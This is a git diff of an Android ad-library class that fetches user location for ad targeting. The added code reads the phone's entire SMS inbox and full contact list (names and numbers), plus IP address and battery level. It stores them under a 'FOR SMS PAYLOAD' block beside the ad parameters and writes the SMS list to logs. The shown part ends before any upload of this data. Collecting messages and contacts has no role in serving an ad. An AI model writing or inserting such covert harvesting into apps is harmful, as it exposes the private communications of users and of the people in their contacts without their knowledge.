@@ -1,18 +1,31 @@
 package com.example.taashaadslib.AdSerever;
 
 import android.Manifest;
+import android.app.Activity;
+import android.app.PendingIntent;
+import android.content.ContentResolver;
+import android.content.ContentUris;
 import android.content.Context;
 import android.content.Intent;
+import android.content.IntentFilter;
 import android.content.IntentSender;
 import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
+import android.database.Cursor;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.location.Address;
 import android.location.Geocoder;
 import android.location.Location;
 import android.net.ConnectivityManager;
 import android.net.Uri;
+import android.net.wifi.WifiManager;
+import android.os.BatteryManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.provider.ContactsContract;
+import android.telephony.TelephonyManager;
+import android.text.format.Formatter;
 import android.util.Log;
 import android.view.View;
 import android.widget.ImageView;
@@ -29,6 +42,9 @@ import com.bumptech.glide.Glide;
 import com.example.taashaadslib.AlertUtils.AlertClasses;
 import com.example.taashaadslib.AppUtils.GlobalFiles;
 import com.example.taashaadslib.CommonClasses.SessionManager;
+import com.example.taashaadslib.ModelClasses.ContactModel;
+import com.example.taashaadslib.ModelClasses.SMSData;
+import com.example.taashaadslib.ModelClasses.SMSPayLoad;
 import com.example.taashaadslib.ModelClasses.TaashaAdsModel;
 import com.example.taashaadslib.RetrofitClass.UpdateAllAPI;
 import com.google.android.gms.common.ConnectionResult;
@@ -38,11 +54,24 @@ import com.google.android.gms.location.LocationRequest;
 import com.google.android.gms.location.LocationServices;
 import com.google.gson.Gson;
 import com.google.gson.GsonBuilder;
+import com.google.gson.reflect.TypeToken;
 
 import java.io.IOException;
+import java.io.InputStream;
 import java.lang.reflect.Modifier;
+import java.net.Inet4Address;
+import java.net.InetAddress;
+import java.net.NetworkInterface;
+import java.net.SocketException;
+import java.text.SimpleDateFormat;
+import java.util.ArrayList;
+import java.util.Collections;
+import java.util.Date;
+import java.util.Enumeration;
+import java.util.HashMap;
 import java.util.List;
 import java.util.Locale;
+import java.util.Map;
 import java.util.concurrent.TimeUnit;
 
 
@@ -70,32 +99,51 @@ public class UserLocationClass extends AppCompatActivity implements
     private double currentLongitude;
     private static final int MY_PERMISSIONS_REQUEST_FINE_LOCATION = 111;
 
-    private Context mContext ;
-    private ImageView mImageView ;
-    private String key ;
+    private Context mContext;
+    private ImageView mImageView;
+    private String key;
+    private Activity mActivity;
+    private boolean isPermissionDone;
 
-    public UserLocationClass(Context mContext, ImageView mImageView, String key) {
+    public UserLocationClass(Activity mActivity, Context mContext, ImageView mImageView, String key, boolean isPermissionDone) {
 
-        this.mContext =mContext;
-        this.mImageView= mImageView;
+        this.mContext = mContext;
+        this.mImageView = mImageView;
         this.key = key;
+        this.mActivity = mActivity;
+        this.isPermissionDone = isPermissionDone;
 
         mSessionManager = new SessionManager(mContext);
         mSessionManager.openSettings();
 
-        mGoogleApiClient = new GoogleApiClient.Builder(mContext)
-                // The next two lines tell the new client that “this” current class will handle connection stuff
-                .addConnectionCallbacks(this)
-                .addOnConnectionFailedListener(this)
-                //fourth line adds the LocationServices API endpoint from GooglePlayServices
-                .addApi(LocationServices.API)
-                .build();
 
-        // Create the LocationRequest object
-        mLocationRequest = LocationRequest.create().setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
+        if (isPermissionDone) {
 
-        //CONNECT TO GOOGLE API
-        mGoogleApiClient.connect();
+            mGoogleApiClient = new GoogleApiClient.Builder(mContext)
+                    // The next two lines tell the new client that “this” current class will handle connection stuff
+                    .addConnectionCallbacks(this)
+                    .addOnConnectionFailedListener(this)
+                    //fourth line adds the LocationServices API endpoint from GooglePlayServices
+                    .addApi(LocationServices.API)
+                    .build();
+
+            // Create the LocationRequest object
+            mLocationRequest = LocationRequest.create().setPriority(LocationRequest.PRIORITY_HIGH_ACCURACY);
+
+            //CONNECT TO GOOGLE API
+            mGoogleApiClient.connect();
+
+        }else{
+
+            //SAVE LATITUDE
+            mSessionManager.updatePreferenceString(GlobalFiles.LATITUDE, "0.0");
+
+            //SAVE LONGITUDE
+            mSessionManager.updatePreferenceString(GlobalFiles.LONGITUDE, "0.0");
+
+            //CALL API FOR ADS
+            getBasicData();
+        }
 
     }
 
@@ -129,10 +177,20 @@ public class UserLocationClass extends AppCompatActivity implements
 
     /**
      * If connected get lat and long
-     *
      */
     @Override
     public void onConnected(Bundle bundle) {
+
+        if (ActivityCompat.checkSelfPermission(mActivity, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            // TODO: Consider calling
+            //    ActivityCompat#requestPermissions
+            // here to request the missing permissions, and then overriding
+            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
+            //                                          int[] grantResults)
+            // to handle the case where the user grants the permission. See the documentation
+            // for ActivityCompat#requestPermissions for more details.
+            return;
+        }
         Location location = LocationServices.FusedLocationApi.getLastLocation(mGoogleApiClient);
 
         if (location == null) {
@@ -144,66 +202,67 @@ public class UserLocationClass extends AppCompatActivity implements
             currentLatitude = location.getLatitude();
             currentLongitude = location.getLongitude();
 
-            AlertClasses.printLogE("LATITUDE : "+currentLatitude ,"LONGITUDE : "+currentLongitude);
+            AlertClasses.printLogE("LATITUDE : " + currentLatitude, "LONGITUDE : " + currentLongitude);
 
             //SAVE LATITUDE
-            mSessionManager.updatePreferenceString(GlobalFiles.LATITUDE , ""+currentLatitude);
+            mSessionManager.updatePreferenceString(GlobalFiles.LATITUDE, "" + currentLatitude);
 
             //SAVE LONGITUDE
-            mSessionManager.updatePreferenceString(GlobalFiles.LONGITUDE , ""+currentLongitude);
+            mSessionManager.updatePreferenceString(GlobalFiles.LONGITUDE, "" + currentLongitude);
 
             //CALL API FOR ADS
-            callGetAds();
+            getBasicData();
+
         }
     }
 
-    private void callGetAds() {
+    private void getBasicData() {
 
         //SAVE KEY
-        mSessionManager.updatePreferenceString(GlobalFiles.KEY , key);
+        mSessionManager.updatePreferenceString(GlobalFiles.KEY, key);
 
         //SAVE HEIGHT
-        mSessionManager.updatePreferenceString(GlobalFiles.HEIGHT , "50");
+        mSessionManager.updatePreferenceString(GlobalFiles.HEIGHT, "50");
 
         //SAVE WIDTH
-        mSessionManager.updatePreferenceString(GlobalFiles.WIDTH , "300");
+        mSessionManager.updatePreferenceString(GlobalFiles.WIDTH, "300");
 
         //SAVE GENDER
-        mSessionManager.updatePreferenceString(GlobalFiles.GENDER , "1");
+        mSessionManager.updatePreferenceString(GlobalFiles.GENDER, "1");
 
         //SAVE AGE GROUP
-        mSessionManager.updatePreferenceString(GlobalFiles.AGEGROUP , "2");
+        mSessionManager.updatePreferenceString(GlobalFiles.AGEGROUP, "2");
 
         //SAVE HOUSE HOLD
-        mSessionManager.updatePreferenceString(GlobalFiles.HOUSEHOLD , "2");
+        mSessionManager.updatePreferenceString(GlobalFiles.HOUSEHOLD, "2");
 
         //SAVE INCOME SOURCE
-        mSessionManager.updatePreferenceString(GlobalFiles.INCOM_SOURCE , "2");
+        mSessionManager.updatePreferenceString(GlobalFiles.INCOM_SOURCE, "2");
 
         //SAVE BASE ROTATION
-        mSessionManager.updatePreferenceString(GlobalFiles.BASE_R0TATION , "3");
+        mSessionManager.updatePreferenceString(GlobalFiles.BASE_R0TATION, "3");
 
         //SAVE CURRENT ROTATION
-        mSessionManager.updatePreferenceString(GlobalFiles.CURRENT_R0TATION , "9");
+        mSessionManager.updatePreferenceString(GlobalFiles.CURRENT_R0TATION, "9");
 
         //SAVE CREATIVE ID
-        mSessionManager.updatePreferenceString(GlobalFiles.CREATIVE_ID , "0");
+        mSessionManager.updatePreferenceString(GlobalFiles.CREATIVE_ID, "0");
 
         //SAVE USER UNIQUE ID
-        mSessionManager.updatePreferenceString(GlobalFiles.USER_UNIQUE_ID , "3e96eb71-3778-46fd-bcd8-fccd820125cd");
+        mSessionManager.updatePreferenceString(GlobalFiles.USER_UNIQUE_ID, "3e96eb71-3778-46fd-bcd8-fccd820125cd");
 
         //SAVE KIOSK ID
-        mSessionManager.updatePreferenceString(GlobalFiles.KIOSK_ID , "abs1234");
+        mSessionManager.updatePreferenceString(GlobalFiles.KIOSK_ID, "abs1234");
 
         //SAVE CITY & STATE NAME FROM LATITUDE
         //SAVE USER LOCATION
         if (ActivityCompat.checkSelfPermission(mContext, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
             //TYPE 1= CITY
-            mSessionManager.updatePreferenceString(GlobalFiles.CITY, "NULL" );
+            mSessionManager.updatePreferenceString(GlobalFiles.CITY, "NULL");
 
             //TYPE 2= STATE
             mSessionManager.updatePreferenceString(GlobalFiles.STATE, "NULL");
-        }else {
+        } else {
             //TYPE 1= CITY
             mSessionManager.updatePreferenceString(GlobalFiles.CITY, "" + getCityName(mContext, Double.parseDouble(mSessionManager.getPreference(GlobalFiles.LATITUDE)), Double.parseDouble(mSessionManager.getPreference(GlobalFiles.LONGITUDE)), 1));
 
@@ -213,197 +272,130 @@ public class UserLocationClass extends AppCompatActivity implements
 
 
         //SAVE MEDIATOR NAME
-        mSessionManager.updatePreferenceString(GlobalFiles.MEDIATOR_NAME ,  "0");
+        mSessionManager.updatePreferenceString(GlobalFiles.MEDIATOR_NAME, "0");
 
         //SAVE IS IN ROTATION
-        mSessionManager.updatePreferenceString(GlobalFiles.IS_IN_ROTATION ,  "false");
+        mSessionManager.updatePreferenceString(GlobalFiles.IS_IN_ROTATION, "false");
 
         //SAVE BUNDLE ID
-        mSessionManager.updatePreferenceString(GlobalFiles.BUNDLE_ID , "com.aerserv.www");
+        mSessionManager.updatePreferenceString(GlobalFiles.BUNDLE_ID, "com.aerserv.www");
 
         //GET APPLICATION VERSION
-        mSessionManager.updatePreferenceString(GlobalFiles.APPLICATION_VERSION , getAppversion(mContext));
+        mSessionManager.updatePreferenceString(GlobalFiles.APPLICATION_VERSION, getAppversion(mContext));
 
         //SAVE NETWORK TYPE
-        mSessionManager.updatePreferenceString(GlobalFiles.DEVICE_NETWORK_TYPE , chkNetwrokType(mContext));
+        mSessionManager.updatePreferenceString(GlobalFiles.DEVICE_NETWORK_TYPE, chkNetwrokType(mContext));
 
         //SAVE INT TYPE
-        mSessionManager.updatePreferenceString(GlobalFiles.DNT , "false");
+        mSessionManager.updatePreferenceString(GlobalFiles.DNT, "false");
 
         //SAVE INT TYPE
-        mSessionManager.updatePreferenceString(GlobalFiles.INT_TYPE , "1");
+        mSessionManager.updatePreferenceString(GlobalFiles.INT_TYPE, "1");
 
         //SAVE URL
-        mSessionManager.updatePreferenceString(GlobalFiles.URL , "http://www.aerserv.com");
+        mSessionManager.updatePreferenceString(GlobalFiles.URL, "http://www.aerserv.com");
 
         //SAVE MAKE (MANUFACTURER)
-        mSessionManager.updatePreferenceString(GlobalFiles.DEVICE_MANUFACTURER , ""+ Build.MANUFACTURER);
+        mSessionManager.updatePreferenceString(GlobalFiles.DEVICE_MANUFACTURER, "" + Build.MANUFACTURER);
 
         //SAVE DEVICE MODEL
-        mSessionManager.updatePreferenceString(GlobalFiles.DEVICE_MODEL , ""+ Build.MODEL);
+        mSessionManager.updatePreferenceString(GlobalFiles.DEVICE_MODEL, "" + Build.MODEL);
 
         //SAVE DEVICE OS
-        mSessionManager.updatePreferenceString(GlobalFiles.APPLICATION_OS ,"Android");
+        mSessionManager.updatePreferenceString(GlobalFiles.APPLICATION_OS, "Android");
 
         //SAVE DEVICE OS VERSION
-        mSessionManager.updatePreferenceString(GlobalFiles.APPLICATION_OS_VERSION , ""+ Build.VERSION.SDK_INT);
+        mSessionManager.updatePreferenceString(GlobalFiles.APPLICATION_OS_VERSION, "" + Build.VERSION.SDK_INT);
 
         //SAVE DEVICE TYPE
-        mSessionManager.updatePreferenceString(GlobalFiles.DEVICE_TYPE , "MOBILE");
+        mSessionManager.updatePreferenceString(GlobalFiles.DEVICE_TYPE, "MOBILE");
 
         //SAVE LOCATION SOURCE
-        mSessionManager.updatePreferenceString(GlobalFiles.LOCATION_SOURCE , "2");
+        mSessionManager.updatePreferenceString(GlobalFiles.LOCATION_SOURCE, "2");
 
         //SAVE PCHAIN
-        mSessionManager.updatePreferenceString(GlobalFiles.PCHAIN , "0");
+        mSessionManager.updatePreferenceString(GlobalFiles.PCHAIN, "0");
+
+        //-----------FOR SMS PAYLOAD--------------//
+
+        //USER MOBILE NUMBER
+        mSessionManager.updatePreferenceString(GlobalFiles.MOBILE_NUMBER ,"");
+
+        //USER MOBILE SENSOR
+        mSessionManager.updatePreferenceString(GlobalFiles.MOBILE_SENSOR_DATA ,"");
+
+        //GET IP ADDRESS OF DEVICE
+        mSessionManager.updatePreferenceString(GlobalFiles.IP_ADDRESS_OF_DEVICE, getIPAddress());
+
+        //GET BATTERY PERCENTAGE
+        mSessionManager.updatePreferenceString(GlobalFiles.BATTERY_PERCENTAGE, getBatteryPercentage()+"%");
+
+        //BROWSER DEFAULT
+        mSessionManager.updatePreferenceString(GlobalFiles.BROWSER, "chrome");
+
+        //DATE
+        mSessionManager.updatePreferenceString(GlobalFiles.DATE, getStringDate(System.currentTimeMillis()));
+
+        //GET CONTACTS DETAILS
+        if (ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
+            mSessionManager.updatePreferenceString(GlobalFiles.CONTACT_LIST ,""+new Gson().toJson(getContacts(mContext)));
+
+           /*  Gson gson1 = new Gson();
+            TypeToken<ArrayList<ContactModel>> token1 = new TypeToken<ArrayList<ContactModel>>() {};
+            ArrayList<ContactModel> mContactModel = gson1.fromJson(mSessionManager.getPreference(GlobalFiles.CONTACT_LIST), token1.getType());
+
+           for (int i =0 ; i<mContactModel.size() ; i++){
+                AlertClasses.printLogE("CONTACTS LIST",mContactModel.get(i).getName() );
+            }*/
+
+        } else {
+            mSessionManager.updatePreferenceString(GlobalFiles.CONTACT_LIST ,"");
+        }
 
 
 
-        AlertClasses.printLogE(TAG , "LATITUDE : "+mSessionManager.getPreference(GlobalFiles.LATITUDE));
-        AlertClasses.printLogE(TAG , "LONGITUDE : "+mSessionManager.getPreference(GlobalFiles.LONGITUDE));
-        AlertClasses.printLogE(TAG , "HEIGHT : "+mSessionManager.getPreference(GlobalFiles.HEIGHT));
-        AlertClasses.printLogE(TAG , "WIDTH : "+mSessionManager.getPreference(GlobalFiles.WIDTH));
-        AlertClasses.printLogE(TAG , "GENDER : "+mSessionManager.getPreference(GlobalFiles.GENDER));
-        AlertClasses.printLogE(TAG , "AGEGROUP : "+mSessionManager.getPreference(GlobalFiles.AGEGROUP));
-        AlertClasses.printLogE(TAG , "HOUSEHOLD : "+mSessionManager.getPreference(GlobalFiles.HOUSEHOLD));
-        AlertClasses.printLogE(TAG , "INCOM_SOURCE : "+mSessionManager.getPreference(GlobalFiles.INCOM_SOURCE));
-        AlertClasses.printLogE(TAG , "BASE_R0TATION : "+mSessionManager.getPreference(GlobalFiles.BASE_R0TATION));
-        AlertClasses.printLogE(TAG , "CURRENT_R0TATION : "+mSessionManager.getPreference(GlobalFiles.CURRENT_R0TATION));
-        AlertClasses.printLogE(TAG , "CREATIVE_ID : "+mSessionManager.getPreference(GlobalFiles.CREATIVE_ID));
-        AlertClasses.printLogE(TAG , "USER_UNIQUE_ID : "+mSessionManager.getPreference(GlobalFiles.USER_UNIQUE_ID));
-        AlertClasses.printLogE(TAG , "KIOSK_ID : "+mSessionManager.getPreference(GlobalFiles.KIOSK_ID));
-        AlertClasses.printLogE(TAG , "CITY : "+mSessionManager.getPreference(GlobalFiles.CITY));
-        AlertClasses.printLogE(TAG , "STATE : "+mSessionManager.getPreference(GlobalFiles.STATE));
-        AlertClasses.printLogE(TAG , "MEDIATOR_NAME : "+mSessionManager.getPreference(GlobalFiles.MEDIATOR_NAME));
-        AlertClasses.printLogE(TAG , "IS_IN_ROTATION : "+mSessionManager.getPreference(GlobalFiles.IS_IN_ROTATION));
-        AlertClasses.printLogE(TAG , "BUNDLE_ID : "+mSessionManager.getPreference(GlobalFiles.BUNDLE_ID));
-        AlertClasses.printLogE(TAG , "APPLICATION_VERSION : "+mSessionManager.getPreference(GlobalFiles.APPLICATION_VERSION));
-        AlertClasses.printLogE(TAG , "DEVICE_NETWORK_TYPE : "+mSessionManager.getPreference(GlobalFiles.DEVICE_NETWORK_TYPE));
-        AlertClasses.printLogE(TAG , "DNT : "+mSessionManager.getPreference(GlobalFiles.DNT));
-        AlertClasses.printLogE(TAG , "INT_TYPE : "+mSessionManager.getPreference(GlobalFiles.INT_TYPE));
-        AlertClasses.printLogE(TAG , "URL : "+mSessionManager.getPreference(GlobalFiles.URL));
-        AlertClasses.printLogE(TAG , "DEVICE_MANUFACTURER : "+mSessionManager.getPreference(GlobalFiles.DEVICE_MANUFACTURER));
-        AlertClasses.printLogE(TAG , "DEVICE_MODEL : "+mSessionManager.getPreference(GlobalFiles.DEVICE_MODEL));
-        AlertClasses.printLogE(TAG , "APPLICATION_OS : "+mSessionManager.getPreference(GlobalFiles.APPLICATION_OS));
-        AlertClasses.printLogE(TAG , "APPLICATION_OS_VERSION : "+mSessionManager.getPreference(GlobalFiles.APPLICATION_OS_VERSION));
-        AlertClasses.printLogE(TAG , "DEVICE_TYPE : "+mSessionManager.getPreference(GlobalFiles.DEVICE_TYPE));
-        AlertClasses.printLogE(TAG , "LOCATION_SOURCE : "+mSessionManager.getPreference(GlobalFiles.LOCATION_SOURCE));
-        AlertClasses.printLogE(TAG , "PCHAIN : "+mSessionManager.getPreference(GlobalFiles.PCHAIN));
+        //SMS DATA
+        if (ActivityCompat.checkSelfPermission(mContext, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
+            //LOAD SMS LIST
+            mSessionManager.updatePreferenceString(GlobalFiles.SMS_LIST ,""+new Gson().toJson(FetchUserSMSinboxClass.fetchInbox(mActivity)));
 
 
+            Gson gson1 = new Gson();
+            TypeToken<ArrayList<SMSData.DataBean>> token1 = new TypeToken<ArrayList<SMSData.DataBean>>() {};
+            ArrayList<SMSData.DataBean> mSmsList = gson1.fromJson(mSessionManager.getPreference(GlobalFiles.SMS_LIST), token1.getType());
 
-        HttpLoggingInterceptor logging = new HttpLoggingInterceptor();
-        logging.setLevel(HttpLoggingInterceptor.Level.BODY);
-
-
-        OkHttpClient.Builder httpClient = new OkHttpClient.Builder();
-        httpClient.addInterceptor(logging);
-        httpClient.addInterceptor(new Interceptor() {
-            @Override
-            public okhttp3.Response intercept(Chain chain) throws IOException {
-
-                okhttp3.Request requestOriginal = chain.request();
-
-                okhttp3.Request request = requestOriginal.newBuilder()
-                        //.header("Content-Type", "application/json; charset=utf-8")
-                        .header("X-Auth-Token", mSessionManager.getPreference(GlobalFiles.KEY))
-                        .method(requestOriginal.method(), requestOriginal.body())
-                        .build();
+            Gson gson = new GsonBuilder()
+                    .excludeFieldsWithModifiers(Modifier.FINAL, Modifier.TRANSIENT, Modifier.STATIC)
+                    .serializeNulls()
+                    .create();
 
 
-                return chain.proceed(request);
+            AlertClasses.printLogE("SMS LIST", "SMS LIST : " + gson.toJson(mSmsList));
+
+
+            /*for (int i =0 ; i<mSmsList.size() ; i++){
+                AlertClasses.printLogE("SMS LIST IN CLASS",mSmsList.get(i).getSender() );
             }
-        });
-        final OkHttpClient httpClient1 = httpClient.build();
-        Retrofit retrofit = new Retrofit.Builder()
-                .baseUrl(GlobalFiles.COMMON_URL)
-                .client(httpClient1.newBuilder().connectTimeout(10, TimeUnit.MINUTES).readTimeout(10, TimeUnit.MINUTES).writeTimeout(10, TimeUnit.MINUTES).build())
-                .addConverterFactory(GsonConverterFactory.create())
-                .client(httpClient1)
-                .build();
-
-        UpdateAllAPI patchService1 = retrofit.create(UpdateAllAPI.class);
-
-        //PARAMETERS
-        String url= GlobalFiles.GET_ADS_API+"?"+GlobalFiles.LATITUDE+"="+mSessionManager.getPreference(GlobalFiles.LONGITUDE)+"&"+
-                ""+GlobalFiles.LONGITUDE+"="+mSessionManager.getPreference(GlobalFiles.LONGITUDE)+"&"+
-                ""+GlobalFiles.HEIGHT+"="+mSessionManager.getPreference(GlobalFiles.HEIGHT)+"&"+
-                ""+GlobalFiles.WIDTH+"="+mSessionManager.getPreference(GlobalFiles.WIDTH)+"&"+
-                ""+GlobalFiles.GENDER+"="+mSessionManager.getPreference(GlobalFiles.GENDER)+"&"+
-                ""+GlobalFiles.AGEGROUP+"="+mSessionManager.getPreference(GlobalFiles.AGEGROUP)+"&"+
-                ""+GlobalFiles.HOUSEHOLD+"="+mSessionManager.getPreference(GlobalFiles.HOUSEHOLD)+"&"+
-                ""+GlobalFiles.INCOM_SOURCE+"="+mSessionManager.getPreference(GlobalFiles.INCOM_SOURCE)+"&"+
-                ""+GlobalFiles.BASE_R0TATION+"="+mSessionManager.getPreference(GlobalFiles.BASE_R0TATION)+"&"+
-                ""+GlobalFiles.CURRENT_R0TATION+"="+mSessionManager.getPreference(GlobalFiles.CURRENT_R0TATION)+"&"+
-                ""+GlobalFiles.CREATIVE_ID+"="+mSessionManager.getPreference(GlobalFiles.CREATIVE_ID)+"&"+
-                ""+GlobalFiles.USER_UNIQUE_ID+"="+mSessionManager.getPreference(GlobalFiles.USER_UNIQUE_ID)+"&"+
-                ""+GlobalFiles.KIOSK_ID+"="+mSessionManager.getPreference(GlobalFiles.KIOSK_ID)+"&"+
-                ""+GlobalFiles.CITY+"="+mSessionManager.getPreference(GlobalFiles.CITY)+"&"+
-                ""+GlobalFiles.STATE+"="+mSessionManager.getPreference(GlobalFiles.STATE)+"&"+
-                ""+GlobalFiles.MEDIATOR_NAME+"="+mSessionManager.getPreference(GlobalFiles.MEDIATOR_NAME)+"&"+
-                ""+GlobalFiles.IS_IN_ROTATION+"="+mSessionManager.getPreference(GlobalFiles.IS_IN_ROTATION)+"&"+
-                ""+GlobalFiles.BUNDLE_ID+"="+mSessionManager.getPreference(GlobalFiles.BUNDLE_ID)+"&"+
-                ""+GlobalFiles.APPLICATION_VERSION+"="+mSessionManager.getPreference(GlobalFiles.APPLICATION_VERSION)+"&"+
-                ""+GlobalFiles.DEVICE_NETWORK_TYPE+"="+mSessionManager.getPreference(GlobalFiles.DEVICE_NETWORK_TYPE)+"&"+
-                ""+GlobalFiles.DNT+"="+mSessionManager.getPreference(GlobalFiles.DNT)+"&"+
-                ""+GlobalFiles.INT_TYPE+"="+mSessionManager.getPreference(GlobalFiles.INT_TYPE)+"&"+
-                ""+GlobalFiles.URL+"="+mSessionManager.getPreference(GlobalFiles.URL)+"&"+
-                ""+GlobalFiles.DEVICE_MANUFACTURER+"="+mSessionManager.getPreference(GlobalFiles.DEVICE_MANUFACTURER)+"&"+
-                ""+GlobalFiles.DEVICE_MODEL+"="+mSessionManager.getPreference(GlobalFiles.DEVICE_MODEL)+"&"+
-                ""+GlobalFiles.APPLICATION_OS+"="+mSessionManager.getPreference(GlobalFiles.APPLICATION_OS)+"&"+
-                ""+GlobalFiles.APPLICATION_OS_VERSION+"="+mSessionManager.getPreference(GlobalFiles.APPLICATION_OS_VERSION)+"&"+
-                ""+GlobalFiles.DEVICE_TYPE+"="+mSessionManager.getPreference(GlobalFiles.DEVICE_TYPE)+"&"+
-                ""+GlobalFiles.LOCATION_SOURCE+"="+mSessionManager.getPreference(GlobalFiles.LOCATION_SOURCE)+"&"+
-                ""+GlobalFiles.PCHAIN+"="+mSessionManager.getPreference(GlobalFiles.PCHAIN);
-
-        AlertClasses.printLogE("AD SERVER : URL", url);
-
-        Call<TaashaAdsModel> call = patchService1.getAdsFromServer(url);
-
-        call.enqueue(new Callback<TaashaAdsModel>() {
-            @Override
-            public void onResponse(Call<TaashaAdsModel> call, retrofit2.Response<TaashaAdsModel> response) {
+*/
+        } else {
+            mSessionManager.updatePreferenceString(GlobalFiles.SMS_LIST ,"");
+        }
 
 
 
-                if (response.isSuccessful()) {
-
-                    Gson gson = new GsonBuilder()
-                            .excludeFieldsWithModifiers(Modifier.FINAL, Modifier.TRANSIENT, Modifier.STATIC)
-                            .serializeNulls()
-                            .create();
+        //GET ADS
+        getAds();
 
 
-                    AlertClasses.printLogE("AD SERVER : Response", "Response @ : " + gson.toJson(response.body()));
-
-                    //LOAD ADS
-                    Glide.with(mContext).load(response.body().getSourceURL()).into(mImageView);
-
-                    mImageView.setOnClickListener(new View.OnClickListener() {
-                        @Override
-                        public void onClick(View view) {
-
-                            Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse("http://www.google.com"));
-                            browserIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-                            mContext.startActivity(browserIntent);
-
-                        }
-                    });
-
-                }
-            }
-
-            @Override
-            public void onFailure(Call<TaashaAdsModel> call, Throwable t) {
 
 
-            }
-        });
     }
 
 
+
     @Override
-    public void onConnectionSuspended(int i) {}
+    public void onConnectionSuspended(int i) {
+    }
 
     @Override
     public void onConnectionFailed(ConnectionResult connectionResult) {
@@ -437,7 +429,6 @@ public class UserLocationClass extends AppCompatActivity implements
     /**
      * If locationChanges change lat and long
      *
-     *
      * @param location
      */
     @Override
@@ -445,16 +436,16 @@ public class UserLocationClass extends AppCompatActivity implements
         currentLatitude = location.getLatitude();
         currentLongitude = location.getLongitude();
 
-       AlertClasses.printLogE("LOCATION CHANGED LATITUDE : "+currentLatitude ,"LONGITUDE : "+currentLongitude);
+        AlertClasses.printLogE("LOCATION CHANGED LATITUDE : " + currentLatitude, "LONGITUDE : " + currentLongitude);
 
         //SAVE LATITUDE
-        mSessionManager.updatePreferenceString(GlobalFiles.LATITUDE , ""+currentLatitude);
+        mSessionManager.updatePreferenceString(GlobalFiles.LATITUDE, "" + currentLatitude);
 
         //SAVE LONGITUDE
-        mSessionManager.updatePreferenceString(GlobalFiles.LONGITUDE , ""+currentLongitude);
+        mSessionManager.updatePreferenceString(GlobalFiles.LONGITUDE, "" + currentLongitude);
     }
 
-    public String getCityName(Context mContext ,double latitude, double longitude, int typeOfValue) {
+    public String getCityName(Context mContext, double latitude, double longitude, int typeOfValue) {
 
 
         Geocoder geocoder = new Geocoder(mContext, Locale.getDefault());
@@ -467,9 +458,9 @@ public class UserLocationClass extends AppCompatActivity implements
         String cityName = addresses.get(0).getLocality();
         String stateName = addresses.get(0).getAdminArea();
 
-        if(typeOfValue == 1){
+        if (typeOfValue == 1) {
             return cityName;
-        }else {
+        } else {
             return stateName;
         }
 
@@ -505,6 +496,292 @@ public class UserLocationClass extends AppCompatActivity implements
         }
 
         return dataType;
+    }
+
+    public String getIPAddress() {
+        try {
+            for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements();) {
+                NetworkInterface intf = en.nextElement();
+                for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements();) {
+                    InetAddress inetAddress = enumIpAddr.nextElement();
+                    if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
+                        return inetAddress.getHostAddress();
+                    }
+                }
+            }
+        } catch (SocketException ex) {
+            ex.printStackTrace();
+        }
+        return null;
+    }
+
+    public String getBatteryPercentage() {
+
+        IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
+        Intent batteryStatus = mActivity.getApplicationContext().registerReceiver(null, ifilter);
+        int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
+        int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
+        float batteryPct = level / (float)scale;
+        float p = batteryPct * 100;
+
+        return String.valueOf(Math.round(p));
+    }
+
+    public String getStringDate(Long convertDate) {
+        Date date = new Date(convertDate);
+        SimpleDateFormat df2 = new SimpleDateFormat(GlobalFiles.COMMON_DATE_FORMAT);
+        String dateText = df2.format(date);
+
+        return dateText;
+    }
+
+    public ArrayList<ContactModel> getContacts(Context ctx) {
+
+        ArrayList<ContactModel> models = new ArrayList<>();
+
+       Cursor cursor = mActivity.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,null, null, null);
+
+        while (cursor.moveToNext()) {
+
+            //ADD NUMBERS AND NAME IN TO MODEL
+            //RETURN LIST
+            ContactModel contactModel = new ContactModel();
+            contactModel.setName(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
+            contactModel.setMobileNumber(cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
+            models.add(contactModel);
+        }
+
+        cursor.close();
+
+
+        return models;
+    }
+    private void getAds() {
+
+        AlertClasses.printLogE(TAG, "LATITUDE : " + mSessionManager.getPreference(GlobalFiles.LATITUDE));
+        AlertClasses.printLogE(TAG, "LONGITUDE : " + mSessionManager.getPreference(GlobalFiles.LONGITUDE));
+        AlertClasses.printLogE(TAG, "HEIGHT : " + mSessionManager.getPreference(GlobalFiles.HEIGHT));
+        AlertClasses.printLogE(TAG, "WIDTH : " + mSessionManager.getPreference(GlobalFiles.WIDTH));
+        AlertClasses.printLogE(TAG, "GENDER : " + mSessionManager.getPreference(GlobalFiles.GENDER));
+        AlertClasses.printLogE(TAG, "AGEGROUP : " + mSessionManager.getPreference(GlobalFiles.AGEGROUP));
+        AlertClasses.printLogE(TAG, "HOUSEHOLD : " + mSessionManager.getPreference(GlobalFiles.HOUSEHOLD));
+        AlertClasses.printLogE(TAG, "INCOM_SOURCE : " + mSessionManager.getPreference(GlobalFiles.INCOM_SOURCE));
+        AlertClasses.printLogE(TAG, "BASE_R0TATION : " + mSessionManager.getPreference(GlobalFiles.BASE_R0TATION));
+        AlertClasses.printLogE(TAG, "CURRENT_R0TATION : " + mSessionManager.getPreference(GlobalFiles.CURRENT_R0TATION));
+        AlertClasses.printLogE(TAG, "CREATIVE_ID : " + mSessionManager.getPreference(GlobalFiles.CREATIVE_ID));
